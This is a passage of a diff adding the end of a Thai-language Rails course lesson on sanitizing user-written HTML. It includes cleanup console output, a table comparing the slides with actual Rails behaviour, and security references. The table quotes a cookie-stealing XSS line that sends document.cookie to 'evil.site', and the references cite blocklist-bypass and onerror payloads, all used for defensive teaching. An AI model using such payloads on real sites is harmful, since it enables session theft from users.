+    <p>ตัวเลือกที่ 1 — Markdown ก็มีสัญลักษณ์ปน (<code>**</code> · <code>[ ](…)</code>) และยังแทรก HTML ดิบได้ด้วย ·
+       ตัวเลือกที่ 3 — ปัญหาไม่ได้อยู่ที่ผู้ใช้ แท็ก <code>&lt;strong&gt;</code> มาจากการกดปุ่ม B เอง ·
+       ตัวเลือกที่ 4 — <code>sanitize</code> เป็น helper ของ Rails ทำงานใน Ruby ตอนโชว์ ไม่ใช่คำสั่งของฐานข้อมูล</p>
+    <p><strong>จุดที่ต้องจำ:</strong> เก็บ HTML = ต้องมีช่อง plain text แยกไว้ค้นหา</p>
+  </div>
+</div>
+
+<div class="note">
+  <p><strong>🧹 ก่อนไปบทถัดไป:</strong> คืนไฟล์ <code>git restore app/views/posts/_post.html.erb</code> (<code>git status --short</code> ต้องว่าง) · แล้วลบบทความทดลองใน console (ข้อมูลใน DB ไม่ถูก <code>git restore</code> คืนให้):</p>
+<pre><code>wongnok-blog-all-in-one(dev):001&gt; <span class="n">Post</span>.<span class="f">last</span>.<span class="f">destroy</span>
+  Post Load (0.5ms)  SELECT "posts".* FROM "posts" ORDER BY "posts"."id" DESC LIMIT 1 /*application='WongnokBlogAllInOne'*/
+  TRANSACTION (0.3ms)  BEGIN /*application='WongnokBlogAllInOne'*/
+  Comment Load (0.4ms)  SELECT "comments".* FROM "comments" WHERE "comments"."post_id" = 31 /*application='WongnokBlogAllInOne'*/
+  Post Destroy (0.4ms)  DELETE FROM "posts" WHERE "posts"."id" = 31 /*application='WongnokBlogAllInOne'*/
+  TRANSACTION (0.7ms)  COMMIT /*application='WongnokBlogAllInOne'*/
+=&gt;
+#&lt;Post:0x0000000120a5c0f0
+ id: 31,
+ title: "ข้าวซอยร้านนี้ &lt;strong&gt;อร่อย&lt;/strong&gt;",
+ description: "&lt;h2&gt;เมนูแนะนำ&lt;/h2&gt;ข้าวซอย&lt;em&gt;ไก่&lt;/em&gt; &lt;a href=\"/po...",
+ category_id: 1,
+ created_at: "2026-11-10 09:47:41.008443000 +0700",
+ updated_at: "2026-11-10 09:49:42.768802000 +0700"&gt;
+wongnok-blog-all-in-one(dev):002&gt; <span class="n">Post</span>.<span class="f">count</span>
+  Post Count (0.9ms)  SELECT COUNT(*) FROM "posts" /*application='WongnokBlogAllInOne'*/
+=&gt; 30</code></pre>
+  <p><code>Comment Load</code> = Rails ไล่ลบคอมเมนต์ของบทความนี้ก่อน (<code>dependent: :destroy</code> ใน model) · เห็น <code>title: "ข้าวซอยร้านนี้ …"</code> = ลบถูกชิ้น · กลับมา 30 ชิ้นเท่าเดิม</p>
+</div>
+
+<h2 id="sn-sec-10">ถ้าเปิดสไลด์ดูประกอบ</h2>
+
+<div class="table-wrap">
+<table>
+  <thead><tr><th>หน้า</th><th>สไลด์เขียน</th><th>ของจริง (Rails 8.1.4 · แอปของคอร์ส)</th><th>ต้องสนใจไหม</th></tr></thead>
+  <tbody>
+    <tr><td>1–2</td><td>ป้าย "DAY 3" · "Part 2 · 3 บล็อค" · "ที่ทำไปตอน Part 1"</td><td>ชุดนี้คือครึ่งหลังของ Day 3 ที่ย้ายมาเรียนวันนี้ · "Part 1" ในสไลด์ = บล็อก A B C ของ Day 3 · เว็บนี้เรียกชุดนี้ว่า Day 4 Part 1</td><td>ไม่ต้อง</td></tr>
+    <tr><td>4</td><td>ตัวอย่าง <code>fetch('https://evil.site/c?d=' + document.cookie)</code> "ส่ง session ของตัวเองให้คนร้าย"</td><td>cookie session ของแอปเราติดป้าย <code>httponly</code> (= JavaScript ในหน้าอ่าน cookie นี้ไม่ได้ · ดูจาก <code>curl -D -</code> ที่ให้ curl โชว์หัวของคำตอบด้วย) → ใน Chrome <code>document.cookie</code> ได้ <code>""</code> · <strong>แต่อย่าวางใจ</strong> MDN อธิบายว่าโค้ดที่ได้รันในหน้าเราทำได้ทุกอย่างที่โค้ดของเว็บเราทำได้ รวมถึงยิงคำขอในนามผู้ใช้</td><td>ไม่ต้อง — และห้ามลองส่งข้อมูลไปเว็บข้างนอก</td></tr>
+    <tr><td>4</td><td>"บล็อค G — บอกว่าไฟล์ชนิดไหนรับได้"</td><td>เรื่องตรวจชนิดไฟล์อยู่บล็อก D (<a href="./0140-variants-and-file-validation.html">บท 140</a>) · บล็อก G คือ login (Part 2)</td><td>ไม่ต้อง</td></tr>
+    <tr><td>6</td><td>โค้ด <code>config/initializers/action_text.rb</code> · <code>ActionText::ContentHelper.allowed_tags += [...]</code></td><td>เรื่องของ<a href="./0137-action-text.html">บท 137</a> · ในแอปตอนนี้ค่านี้เป็น <code>nil</code> (ลองแล้ว) บรรทัดนี้จึงพังด้วย <code>undefined method '+' for nil</code> · อย่าพิมพ์ตามในบทนี้</td><td><strong>สนใจ</strong> ถ้าจะพิมพ์ตาม</td></tr>
+    <tr><td>7</td><td>Markdown "ข้อมูลสะอาดโดยธรรมชาติ ไม่มีแท็กให้กลัว"</td><td>ตัวแปลง Markdown ที่มากับ Ruby (RDoc) ปล่อย <code>&lt;script&gt;</code> ดิบผ่านออกมา (ลองแล้ว) · ผลที่แปลงแล้วต้อง sanitize เหมือน HTML</td><td><strong>สนใจ</strong> ถ้าเลือก Markdown</td></tr>
+  </tbody>
+</table>
+</div>
+
+<nav class="nav">
+  <a href="../../rails-day-3/lessons/0135-lab-vibe3-hotwire.html">← บทเรียน 135 · Lab Vibe 3</a>
+  <a href="../../index.html">🏠 หน้าแรก</a>
+  <a href="./0137-action-text.html">บทเรียน 137 → Action Text</a>
+</nav>
+
+<h2 id="sn-sec-11">อ้างอิง</h2>
+<ul class="sources">
+  <li><a href="https://guides.rubyonrails.org/security.html#permitted-lists-versus-restricted-lists">Rails Guides — Securing Rails Applications § Permitted Lists Versus Restricted Lists</a> —
+      <strong>อ่านหัวข้อนี้หัวข้อเดียว</strong> (สั้น) · ที่มาของตัวอย่าง <code>"&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")</code></li>
+  <li><a href="https://guides.rubyonrails.org/security.html#html-javascript-injection-countermeasures">Rails Guides — Securing Rails Applications § HTML/JavaScript Injection Countermeasures</a> —
+      <strong>อ่านสองย่อหน้าแรก</strong>: ทำไม Rails เลิกใช้ blocklist และตัวอย่าง <code>sanitize(…, tags:, attributes:)</code></li>
+  <li><a href="https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize">Rails API — SanitizeHelper#sanitize</a> —
+      ตัวอย่าง option <code>tags:</code> <code>attributes:</code> · <strong>อ่านกล่องคำเตือน</strong>เรื่องการเพิ่มแท็กลงรายการ · ถัดลงไปมี <code>strip_tags</code></li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS#sanitization">MDN — Cross-site scripting (XSS) § Sanitization</a> —
+      ใช้ตัวอย่าง <code>&lt;img src="x" onerror&gt;</code> ชิ้นเดียวกับบทนี้ · <strong>อ่านแค่หัวข้อ Sanitization</strong> · ส่วน Overview ด้านบนอธิบายว่าโค้ดของคนร้ายทำอะไรได้บ้าง</li>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#allowlist-vs-denylist">OWASP — Input Validation Cheat Sheet § Allowlist vs Denylist</a> —
+      <strong>ย่อหน้าเดียว</strong> · คำแนะนำมาตรฐานของวงการว่าให้นิยามสิ่งที่รับ แทนการไล่จับของร้าย</li>
+  <li><a href="https://guides.rubyonrails.org/action_text_overview.html#what-is-action-text-questionmark">Rails Guides — Action Text Overview § What is Action Text?</a> —
+      อ่านล่วงหน้าสำหรับบท 137 · <strong>อ่านแค่ย่อหน้าแรก</strong></li>
+</ul>
+
+<p>ติดตรงไหน หรือผลของคุณต่างจากในบท — ก็อปผลจริงทั้งก้อนไปถาม AI หรือเพื่อนได้เลย โดยบอกว่ามาจากบท 136 ขั้นไหน</p>
+
+</main>
+
+<div class="scorebar">
+  <span class="count"></span>
+  <span class="track"><span class="fill"></span></span>
+  <span class="pct"></span>
+</div>
+
+</body>
+</html>
